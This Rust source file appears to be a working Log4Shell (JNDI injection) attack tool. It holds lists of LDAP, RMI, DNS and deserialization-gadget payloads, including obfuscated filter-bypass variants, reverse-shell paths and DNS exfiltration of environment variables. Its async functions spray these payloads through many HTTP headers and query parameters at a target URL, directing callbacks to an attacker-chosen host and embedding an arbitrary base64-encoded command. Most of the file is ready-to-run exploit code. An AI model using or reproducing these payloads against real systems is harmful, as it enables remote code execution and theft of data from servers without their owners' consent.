use base64::Engine;
use colored::Colorize;
use reqwest::Client;
use std::time::Duration;

fn build_client(timeout: u64) -> Client {
    Client::builder().timeout(Duration::from_secs(timeout)).redirect(reqwest::redirect::Policy::none()).build().unwrap_or_else(|_| Client::new())
}

const LDAP_PAYLOADS: &[&str] = &[
    "${jndi:ldap://evil.com/a}",
    "${jndi:ldap://evil.com:1389/a}",
    "${jndi:ldap://evil.com/a}",
    "${jndi:ldap://evil.com:1389/Exploit}",
    "${jndi:ldap://evil.com:1389/Basic/Command/Base64/aWQ=}",
    "${jndi:ldap://evil.com:1389/Basic/ReverseShell/linux/127.0.0.1/4444}",
    "${jndi:ldap://evil.com:1389/TomcatBypass/Command/Base64/aWQ=}",
    "${jndi:ldap://evil.com:1389/Deserialization/CommonsCollectionsK1/Command/Base64/aWQ=}",
    "${${lower:j}ndi:ldap://evil.com/a}",
    "${${lower:j}${lower:n}${lower:d}i:ldap://evil.com/a}",
    "${jndi:${lower:l}${lower:d}ap://evil.com/a}",
    "${${env:NaN:-j}ndi:ldap://evil.com/a}",
    "${jndi:ldap://${env:FOO:-evil.com}/a}",
    "${::-j}${::-n}${::-d}${::-i}:ldap://evil.com/a}",
];

const RMI_PAYLOADS: &[&str] = &[
    "${jndi:rmi://evil.com/a}",
    "${jndi:rmi://evil.com:1099/a}",
    "${jndi:rmi://evil.com:1099/Exploit}",
    "${jndi:rmi://evil.com:1099/Basic/Command/Base64/aWQ=}",
    "${${lower:j}ndi:rmi://evil.com/a}",
    "${jndi:${lower:r}${lower:m}i://evil.com/a}",
];

const DNS_PAYLOADS: &[&str] = &[
    "${jndi:dns://evil.com/a}",
    "${jndi:dns://evil.com:53/a}",
    "${jndi:dns://${env:USER}.evil.com/a}",
    "${jndi:dns://${sys:java.version}.evil.com/a}",
    "${${lower:j}ndi:dns://evil.com/a}",
    "${jndi:dns://${env:HOSTNAME}.evil.com/a}",
];

const GADGET_PAYLOADS: &[&str] = &[
    "${jndi:ldap://evil.com:1389/Deserialization/CommonsCollections1/Command/Base64/aWQ=}",
    "${jndi:ldap://evil.com:1389/Deserialization/CommonsCollectionsK1/Command/Base64/aWQ=}",
    "${jndi:ldap://evil.com:1389/Deserialization/CommonsBeanutils1/Command/Base64/aWQ=}",
    "${jndi:ldap://evil.com:1389/Deserialization/Jdk7u21/Command/Base64/aWQ=}",
    "${jndi:ldap://evil.com:1389/Deserialization/Groovy1/Command/Base64/aWQ=}",
    "${jndi:ldap://evil.com:1389/Deserialization/Spring1/Command/Base64/aWQ=}",
];

pub async fn ldap(url: &str, callback: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} JNDI LDAP Injection (Log4Shell-style)", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} URL:      {}", "[*]".cyan().bold(), url);
    println!("{} Callback: {}", "[*]".cyan().bold(), callback);
    println!("{} {} LDAP payloads", "[*]".cyan().bold(), LDAP_PAYLOADS.len());
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let payloads: Vec<String> = LDAP_PAYLOADS.iter().map(|p| p.replace("evil.com", callback)).collect();
    let headers_list = ["User-Agent", "X-Api-Version", "Referer", "X-Forwarded-For", "X-Forwarded-Host", "Origin", "Accept", "Cookie", "X-Real-IP", "X-Remote-Addr"];

    let mut sent = 0;
    for (i, payload) in payloads.iter().enumerate() {
        for header in &headers_list {
            match client.get(url).header(*header, payload).send().await {
                Ok(resp) => {
                    sent += 1;
                    let status = resp.status().as_u16();
                    if i == 0 { println!("  {} [{:02}] via {} status={}", "*".cyan(), i + 1, header, status); }
                }
                Err(_) => {}
            }
        }
        // Also try as query param
        let test_url = format!("{}{}q={}", url, if url.contains('?') { "&" } else { "?" }, url_encode(payload));
        let _ = client.get(&test_url).send().await;
        sent += 1;
    }

    println!("\n{} {} total requests sent with LDAP JNDI payloads", "[*]".cyan().bold(), sent);
    println!("{} Check callback host for incoming LDAP connections.", "[!]".red().bold());
    Ok(())
}

pub async fn rmi(url: &str, callback: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} JNDI RMI Injection", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} URL:      {}", "[*]".cyan().bold(), url);
    println!("{} Callback: {}", "[*]".cyan().bold(), callback);
    println!("{} {} RMI payloads", "[*]".cyan().bold(), RMI_PAYLOADS.len());
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let payloads: Vec<String> = RMI_PAYLOADS.iter().map(|p| p.replace("evil.com", callback)).collect();
    let mut sent = 0;

    for (i, payload) in payloads.iter().enumerate() {
        match client.get(url).header("User-Agent", payload).header("X-Api-Version", payload).send().await {
            Ok(resp) => {
                sent += 1;
                println!("  {} [{:02}] status={}", "*".cyan(), i + 1, resp.status().as_u16());
            }
            Err(_) => { println!("  {} [{:02}] error", "*".red(), i + 1); }
        }
    }

    println!("\n{} {} RMI payloads sent. Check callback for connections.", "[*]".cyan().bold(), sent);
    Ok(())
}

pub async fn dns(url: &str, callback: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} JNDI DNS Injection (Blind Detection)", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} URL:      {}", "[*]".cyan().bold(), url);
    println!("{} Callback: {}", "[*]".cyan().bold(), callback);
    println!("{} {} DNS payloads", "[*]".cyan().bold(), DNS_PAYLOADS.len());
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let mut sent = 0;

    for (i, payload) in DNS_PAYLOADS.iter().enumerate() {
        let p = payload.replace("evil.com", callback);
        match client.get(url).header("User-Agent", &p).header("Referer", &p).header("X-Forwarded-For", &p).send().await {
            Ok(resp) => {
                sent += 1;
                println!("  {} [{:02}] status={} payload={}", "*".cyan(), i + 1, resp.status().as_u16(), p.chars().take(50).collect::<String>());
            }
            Err(_) => { println!("  {} [{:02}] error", "*".red(), i + 1); }
        }
    }

    println!("\n{} {} DNS payloads sent. Check callback for DNS queries.", "[*]".cyan().bold(), sent);
    println!("{} DNS-based JNDI is the safest blind detection method.", "[*]".cyan().bold());
    Ok(())
}

pub async fn gadget(url: &str, callback: &str, timeout: u64, cmd: &str) -> anyhow::Result<()> {
    println!("{} JNDI Gadget Chain Delivery", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} URL:      {}", "[*]".cyan().bold(), url);
    println!("{} Callback: {}", "[*]".cyan().bold(), callback);
    println!("{} Command:  {}", "[*]".cyan().bold(), cmd);
    println!("{} {} gadget payloads", "[*]".cyan().bold(), GADGET_PAYLOADS.len());
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let cmd_b64 = base64::engine::general_purpose::STANDARD.encode(cmd);
    let mut sent = 0;

    for (i, payload) in GADGET_PAYLOADS.iter().enumerate() {
        let p = payload.replace("evil.com", callback).replace("aWQ=", &cmd_b64);
        match client.get(url).header("User-Agent", &p).header("X-Api-Version", &p).header("Referer", &p).send().await {
            Ok(resp) => {
                sent += 1;
                let status = resp.status().as_u16();
                let body = resp.text().await.unwrap_or_default();
                let exploited = body.contains("uid=") || body.contains("root") || !body.is_empty();
                let tag = if exploited { "RESPONSE".yellow().to_string() } else { "sent".cyan().to_string() };
                println!("  {} [{:02}] status={} {} — {}", "*".cyan(), i + 1, status, tag, p.chars().take(60).collect::<String>());
            }
            Err(_) => { println!("  {} [{:02}] error", "*".red(), i + 1); }
        }
    }

    println!("\n{} {} gadget payloads sent with cmd='{}'", "[*]".cyan().bold(), sent, cmd);
    println!("{} Requires a rogue LDAP server on callback host serving gadget classes.", "[*]".cyan().bold());
    Ok(())
}

fn url_encode(s: &str) -> String {
    let mut result = String::new();
    for c in s.chars() {
        if c.is_ascii_alphanumeric() || c == '-' || c == '_' || c == '.' || c == '~' { result.push(c); }
        else { for b in c.to_string().bytes() { result.push_str(&format!("%{:02X}", b)); } }
    }
    result
}
